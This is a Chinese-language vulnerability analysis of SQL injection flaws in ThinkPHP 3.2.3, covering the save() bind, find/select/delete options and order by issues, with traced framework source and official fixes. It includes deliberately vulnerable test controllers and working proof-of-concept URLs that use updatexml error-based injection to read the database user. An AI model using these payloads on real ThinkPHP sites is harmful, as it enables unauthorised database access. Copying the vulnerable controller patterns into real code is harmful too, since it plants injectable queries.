<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-comment">// 要修改的数据对象属性赋值</span><br><span class="hljs-variable">$User</span>-&gt;name = <span class="hljs-string">&#x27;ThinkPHP&#x27;</span>;<br><span class="hljs-variable">$User</span>-&gt;email = <span class="hljs-string">&#x27;ThinkPHP@gmail.com&#x27;</span>;<br><span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-string">&#x27;id=5&#x27;</span>)-&gt;save(); <span class="hljs-comment">// 根据条件更新记录</span><br></code></pre></td></tr></table></figure>

<h3 id="构造save-的场景"><a href="#构造save-的场景" class="headerlink" title="构造save()的场景"></a>构造save()的场景</h3><p>这里我们构建一个使用save()方法的场景，并且where()传入数组形式的参数，目的是为了进入bind的处理逻辑。外部参数我们使用严格<strong>I方法</strong>来接收</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>        <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;jop&#x27;</span>] = <span class="hljs-string">&#x27;111&#x27;</span>;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;save(<span class="hljs-variable">$data</span>);<br>        var_dump(<span class="hljs-variable">$res</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>为了进入 ‘bind’ 的处理逻辑，下面将构造以下连接测试注入：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://tp.test:8888/index.php/home/index/test?name</span>[<span class="hljs-string">0</span>]=bind&amp;name[1]=kkey&#x27;<br></code></pre></td></tr></table></figure>

<h3 id="save-处理逻辑"><a href="#save-处理逻辑" class="headerlink" title="save()处理逻辑"></a>save()处理逻辑</h3><p>where() 的处理逻辑在安全过滤机制一节中有提到，当我们传入数组参数时在where()中不会被过滤，参数最终会被放到模型对象的 options 数组属性中保存。上面分析过select()怎么处理的options数组，现在将来 save() 的处理方式</p>
<blockquote>
<p>ThinkPHP/Library/Think/Model.class.php</p>
</blockquote>
<ul>
<li>where()方法上面已经分析过，只需要知道当前model类对象的<code>$options</code>存储着where字段的数据，<code>$data</code> 则是存放的set字段的数据</li>
<li><code>$data</code>，<code>$options</code> 是组成sql语句的关键，最终将交于 <code>db-&gt;update()</code> 实现</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Model.class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> </span>&#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>    		……<br>       	<span class="hljs-comment">//	底层由数据库Driver类update()实现</span><br>        <span class="hljs-variable">$result</span>     =   <span class="hljs-keyword">$this</span>-&gt;db-&gt;update(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$options</span>);<br>				……<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>ThinkPHP/Library/Think/Db/Driver.class.php</p>
</blockquote>
<p>把重点放到底层update()的实现上：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Db/Driver.class.php</span><br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Driver</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$options</span></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span>  =   <span class="hljs-keyword">$this</span>-&gt;parseTable(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]);<br>    		<span class="hljs-comment">//  此时sql语句构造为 UPDATE xxx set yyy </span><br>        <span class="hljs-variable">$sql</span>   	= <span class="hljs-string">&#x27;UPDATE &#x27;</span> . <span class="hljs-variable">$table</span> . <span class="hljs-keyword">$this</span>-&gt;parseSet(<span class="hljs-variable">$data</span>);<br>				<span class="hljs-comment">//	解析where字段</span><br>        <span class="hljs-variable">$sql</span> .= <span class="hljs-keyword">$this</span>-&gt;parseWhere(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>);<br>        ……<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;execute(<span class="hljs-variable">$sql</span>,!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;fetch_sql&#x27;</span>]) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>首先 <code>$data</code> 由<strong>parseSet()<strong>解析为set字段，</strong>parseSet()</strong> 就不细看了，==该方法解析的set字段的将会用<strong>命名（:name）</strong>形式的占位标记符，其中占位标记符的值已经放在了bind数组中==，可以看出tp想做预编译的操作了</li>
</ul>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210728160437576.png" srcset="/img/loading.gif" lazyload alt="image-20210728160437576" style="zoom:50%;" />

<ul>
<li><p>然后就进入where字段的解析，解析方法为 <code>parseWhere()</code></p>
<ul>
<li><p><code>parseWhere()</code> 也不进入细看了，就是数组参数最终会交给 <code>parseWhereItem()</code> 解析</p>
</li>
<li><p><code>parseWhereItem()</code>前面已有分析，这里也不再仔细分析了，当注入的<code>$exp</code>（代表运算符）等于bind时，传入的参数不会被过滤，而是在where字段中添加” =: “符号，本漏洞的关键点在于如何去消除这个” : “符号的影响</p>
<p>如下图，==where字段的数据奇怪的加入了这个预编译，明显where字段的值没有加入bind数组，这里也很关键，因为后面bind数组会被过滤==</p>
</li>
</ul>
</li>
</ul>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210728160553076.png" srcset="/img/loading.gif" lazyload alt="image-20210728160553076" style="zoom:50%;" />

<ul>
<li><code>$sql</code> 为最终解析完成的sql语句，交于 <code>execute()</code> 执行</li>
</ul>
<hr>
<p>跟踪 execute() 方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Db/Driver.class.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>,<span class="hljs-variable">$fetchSql</span>=<span class="hljs-literal">false</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;queryStr = <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;bind))&#123;<br>            <span class="hljs-variable">$that</span>   =   <span class="hljs-keyword">$this</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;queryStr =   strtr(<span class="hljs-keyword">$this</span>-&gt;queryStr,array_map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$val</span></span>) <span class="hljs-keyword">use</span>(<span class="hljs-params"><span class="hljs-variable">$that</span></span>)</span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>.<span class="hljs-variable">$that</span>-&gt;escapeString(<span class="hljs-variable">$val</span>).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="hljs-keyword">$this</span>-&gt;bind));<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fetchSql</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;queryStr;<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;bind <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;PDOStatement-&gt;bindValue(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$val</span>);<br>        &#125;<br>        <span class="hljs-variable">$result</span> =   <span class="hljs-keyword">$this</span>-&gt;PDOStatement-&gt;execute();<br></code></pre></td></tr></table></figure>

<ul>
<li><code>$str</code> 即为要执行的sql语句</li>
<li>重点关注 <code>$this-&gt;queryStr</code> 的处理，这里会执行两个函数，一个 <code>strst()</code> 字符串替换函数，一个使用<code>array_map()</code>调用的匿名函数<ul>
<li>匿名函数就是调用 <code>escapeString()</code> 过滤<strong>bind</strong>数组，前面知道 ==bind 数组只有set字段的值，where字段的值还是没有被过滤==</li>
<li><code>strst()</code> 将会把占位标记符转换为 bind 数组中对应的值，如：$bind=[‘:0’=&gt;’111’,’:1’=&gt;’222’]，那么sql语句中**’:0’<strong>字符会被替换为</strong>‘111’<strong>，</strong>‘:1’<strong>被替换为</strong>‘222’**。==利用的关键点来了，我们把where语句最终控制为”:0”，那么替换时”:”将被消除，从而消除了<code>:</code>对注入语句的影响==</li>
</ul>
</li>
</ul>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210728163326968.png" srcset="/img/loading.gif" lazyload alt="image-20210728163326968" style="zoom:50%;" />

<ul>
<li><code>$this-&gt;queryStr</code> 语句处理好后，再通过预编译执行该语句，可惜其中的占位标记符已经被替换了，在预处理前就已经发生了注入，漏洞产生</li>
</ul>
<h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>poc如下，传入的name为数组，name[0]=bind目的是进入bind的逻辑，name[1]为payload数据，其中第一位字符要为0</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://tp.test:<span class="hljs-number">8888</span>/index.php/home/index/test?name[<span class="hljs-number">0</span>]=bind&amp;name[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span> and (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>))--+<br></code></pre></td></tr></table></figure>

<p>实际执行的sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">UPDATE `think_user` <span class="hljs-keyword">SET</span> `job`<span class="hljs-operator">=</span><span class="hljs-string">&#x27;111&#x27;</span> <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;111&#x27;</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>

<p>验证图：</p>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210728164652838.png" srcset="/img/loading.gif" lazyload alt="image-20210728164652838" style="zoom: 33%;" />

<h3 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h3><p>前面提到利用<strong>I方法</strong>获取输入时并没有过滤BIND，导致我们可以进入BIND的逻辑，从而使得我们的数组参数从头到尾都没有被过滤。官方便在这一点上做了过滤。所以该漏洞在ThinkPHP&lt;=3.2.3都是存在的</p>
<p>注意：如果没有使用<strong>I方法</strong>接收外部数据，那么下面的修复就没有意义了，这漏洞照样使用</p>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210730161446223.png" srcset="/img/loading.gif" lazyload alt="image-20210730161446223" style="zoom:50%;" />

<h2 id="select-amp-delete-注入漏洞"><a href="#select-amp-delete-注入漏洞" class="headerlink" title="select&amp;delete 注入漏洞"></a>select&amp;delete 注入漏洞</h2><p>这其实是ThinkPHP的一个隐藏用法，在前面提到，ThinkPHP使用where()，field()等方法获取获取sql语句的各个部分，然后存放到当前模型对象的 <code>$this-&gt;options</code> 属性数组中，最后在使用 select() 这些方法从 <code>$this-&gt;options</code> 数组中解析出对应的sql语句执行</p>
<p>但在阅读代码过程中发现find()，select()，delete()本身可以接收 <code>$options</code> 数组参数，覆盖掉 <code>$this-&gt;options</code> 的值。不过这种用法官方文档并没有提及，想要遇到这中情况可能还需要开发者们配合，下面看看这个漏洞是怎么产生的，这里分析find()方法</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><blockquote>
<p>ThinkPHP/Library/Think/Model.class.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> </span>&#123;<br>  	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>          =   <span class="hljs-keyword">array</span>();<br>		<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-variable">$options</span>) || is_string(<span class="hljs-variable">$options</span>)) &#123;<span class="hljs-comment">//$options不为数组的情况</span><br>            <span class="hljs-variable">$where</span>[<span class="hljs-keyword">$this</span>-&gt;getPk()]  =   <span class="hljs-variable">$options</span>;<br>            <span class="hljs-variable">$options</span>                =   <span class="hljs-keyword">array</span>();<br>            <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]       =   <span class="hljs-variable">$where</span>;<br>        &#125;<br>        <span class="hljs-comment">// 根据复合主键查找记录</span><br>        <span class="hljs-variable">$pk</span>  =  <span class="hljs-keyword">$this</span>-&gt;getPk();<br>        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$options</span>) &amp;&amp; (count(<span class="hljs-variable">$options</span>) &gt; <span class="hljs-number">0</span>) &amp;&amp; is_array(<span class="hljs-variable">$pk</span>)) &#123;<span class="hljs-comment">//$options为数组且主键也为数组的情况</span><br>            <span class="hljs-comment">// 根据复合主键查询</span><br>          	……<br>        &#125;<br>      	<span class="hljs-comment">// 总是查找一条记录</span><br>        <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]   =   <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// 分析表达式</span><br>        <span class="hljs-variable">$options</span>            =   <span class="hljs-keyword">$this</span>-&gt;_parseOptions(<span class="hljs-variable">$options</span>);<br>      	……<br>        <span class="hljs-variable">$resultSet</span>          =   <span class="hljs-keyword">$this</span>-&gt;db-&gt;select(<span class="hljs-variable">$options</span>);<span class="hljs-comment">//底层查询的语句</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>find()</code> 可以接收外部参数 <code>$options</code>，官方文档没有提及这个用法</li>
<li><code>getPk()</code> 获取当前的主键，默认为’id’</li>
<li><code>$options</code> 为数字类型或字符串类型时，<code>$where[&#39;id&#39;]=$options,$options[&#39;where&#39;]=$where</code>，该处只可以控制部分where字段的值，利用比较苛刻</li>
<li><code>$options</code> 为数组类型时，且主键 <code>$pk</code> 也为数组类型时，将会进入复合主键查询。但一般默认主键 <code>$pk=id</code>，不为数组</li>
<li><code>$options</code> 最终由 <code>_parseOptions()</code> 获取。跟踪 <code>_parseOptions()</code> 方法，可以看到最终 <code>$options</code> 将由**find()<strong>方法传入的<code>$options</code> 和</strong>where()**等方法传入的<code>$this-&gt;options</code>合并完成，注意<code>array_merge()</code>第二个参数是会覆盖第一个参数的值的，所以如果<code>find()</code>方法传入的<code>$options</code> 可控，那么整个sql语句也可控</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Model.class.php</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_parseOptions</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>		<span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$options</span>))<br>				<span class="hljs-variable">$options</span> =  array_merge(<span class="hljs-keyword">$this</span>-&gt;options,<span class="hljs-variable">$options</span>);<br>  	……<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$options</span>;<br></code></pre></td></tr></table></figure>

<p>现在sql语句可控了，能想到的是在数据库底层类中的parsewhere()方法解析where字段时，对字符串参数不会过滤，由下面代码，需要控制<code>$options[&#39;where&#39;]</code>为字符串类型即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Db/Driver.class.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseSql</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>,<span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span>&#123;<br>  	<span class="hljs-comment">// parseWhere()接收的是$options[&#x27;where&#x27;]</span><br>		<span class="hljs-keyword">$this</span>-&gt;parseWhere(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>)<br>    ……<br>      <br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseWhere</span>(<span class="hljs-params"><span class="hljs-variable">$where</span></span>) </span>&#123;<br>    <span class="hljs-variable">$whereStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(is_string(<span class="hljs-variable">$where</span>)) &#123;<br>    		<span class="hljs-comment">// 直接使用字符串条件</span><br>        <span class="hljs-variable">$whereStr</span> = <span class="hljs-variable">$where</span>;<br>    ……<br></code></pre></td></tr></table></figure>

<h3 id="场景构造"><a href="#场景构造" class="headerlink" title="场景构造"></a>场景构造</h3><p>构造一个<code>find()</code>方法接收外部参数，这种写法可能存在漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>  	<span class="hljs-variable">$id</span> = I(<span class="hljs-string">&#x27;GET.id&#x27;</span>);<br>    <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>  	<span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;find(<span class="hljs-variable">$id</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>poc如下，要传入id[‘where’]数组</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://tp.test:8888/home/index/test?id</span>[<span class="hljs-string">where</span>]=(1=1) and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+<br></code></pre></td></tr></table></figure>

<p>实际执行的sql语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">-- LIMIT 1</span><br></code></pre></td></tr></table></figure>

<h3 id="官方修复-1"><a href="#官方修复-1" class="headerlink" title="官方修复"></a>官方修复</h3><p>官方在修复上就是在 <code>_parseOptions()</code> 处忽略了外部传入的 <code>$options</code>，这样我们传入的数据只能用于主键查询，而主键查询最终会转换为数组格式，数组格式数据在后面也会被过滤，那么这个漏洞就不存在了</p>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210729120607836.png" srcset="/img/loading.gif" lazyload alt="image-20210729120607836" style="zoom:50%;" />

<p>Model.class.php 类中 delete(), select() 方法具有相同问题，也在ThinkPHP3.2.4中被修复</p>
<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>可以看到ThinkPHP在处理sql查询时分的很细，做出了一个可控的主键查询这个功能，让用户可以控制主键查询的值，但始终保存主键查询的数据为数组形式可以被过滤，就保证了数据的安全性，但却忽略了一些意外的情况，导致sql注入。这个漏洞同样是需要很对ThinkPHP底层逻辑十分清楚</p>
<h2 id="order-by-注入漏洞"><a href="#order-by-注入漏洞" class="headerlink" title="order by 注入漏洞"></a>order by 注入漏洞</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>ThinkPHP的模型基类Model并没有直接提供order的方法，而是用 <code>__call()</code> 魔术方法来获取一些特殊方法的参数，代码如下：</p>
<blockquote>
<p>ThinkPHP/Library/Think/Model.class.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> </span>&#123;<br>  	<span class="hljs-comment">// 查询表达式参数</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>          =   <span class="hljs-keyword">array</span>();<br>  	<span class="hljs-comment">// 链操作方法列表</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$methods</span>          =   <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;strict&#x27;</span>,<span class="hljs-string">&#x27;order&#x27;</span>,<span class="hljs-string">&#x27;alias&#x27;</span>,<span class="hljs-string">&#x27;having&#x27;</span>,<span class="hljs-string">&#x27;group&#x27;</span>,……);<br>  	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(in_array(strtolower(<span class="hljs-variable">$method</span>),<span class="hljs-keyword">$this</span>-&gt;methods,<span class="hljs-literal">true</span>)) &#123;<br>            <span class="hljs-comment">// 连贯操作的实现</span><br>            <span class="hljs-keyword">$this</span>-&gt;options[strtolower(<span class="hljs-variable">$method</span>)] =   <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>;<br>        &#125;<br>    		……<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当调用模型对象的 order() 方法时，因为模型对象不具有order()便触发了 <code>__call()</code> 方法，在 <code>__call()</code> 方法中，传入order()方法的第一个参数 $arg[0] 将赋值给 <code>$this-&gt;options[&#39;order&#39;]</code></p>
<p>最终 options[‘order’] 将由给 parseOrder() 解析</p>
<blockquote>
<p>ThinkPHP/Library/Think/Db/Driver.class.php</p>
</blockquote>
<p>在 Thinkphp3.2.3 中 parseOrder() 实现的十分简单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Driver</span> </span>&#123;<br>		<span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseOrder</span>(<span class="hljs-params"><span class="hljs-variable">$order</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$order</span>)) &#123;<br>            <span class="hljs-variable">$array</span>   =  <span class="hljs-keyword">array</span>();<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$order</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>                <span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-variable">$key</span>)) &#123;<br>                    <span class="hljs-variable">$array</span>[] =  <span class="hljs-keyword">$this</span>-&gt;parseKey(<span class="hljs-variable">$val</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$array</span>[] =  <span class="hljs-keyword">$this</span>-&gt;parseKey(<span class="hljs-variable">$key</span>).<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-variable">$order</span>   =  implode(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$array</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$order</span>)?  <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span>:<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>parseOrder()的参数 <code>$order</code> 来自 <code>$options[&#39;order&#39;]</code></li>
<li>过程对 <code>$order</code> 没有任何过滤，可以任意注入。。。</li>
</ul>
